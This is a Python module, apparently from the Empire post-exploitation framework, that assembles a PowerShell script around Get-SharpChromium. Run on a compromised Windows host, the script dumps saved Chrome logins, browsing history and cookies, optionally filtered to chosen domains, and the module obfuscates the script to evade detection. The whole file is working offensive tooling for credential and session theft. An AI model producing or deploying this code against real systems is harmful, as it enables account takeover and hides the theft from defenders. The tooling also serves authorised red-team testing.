from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        module_source = main_menu.installPath + "/data/module_source/collection/Get-SharpChromium.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code

        script_end = " Get-SharpChromium"

        #check type
        if params['Type'].lower() not in ['all','logins','history','cookies']:
            print(helpers.color("[!] Invalid value of Type, use default value: all"))
            params['Type']='all'
        script_end += " -Type "+params['Type']
        #check domain
        if params['Domains'].lower() != '':
            if params['Type'].lower() != 'cookies':
                print(helpers.color("[!] Domains can only be used with Type cookies"))
            else:
                script_end += " -Domains ("
                for domain in params['Domains'].split(','):
                    script_end += "'" + domain + "',"
                script_end = script_end[:-1]
                script_end += ")"

        outputf = params.get("OutputFunction", "Out-String")
        script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
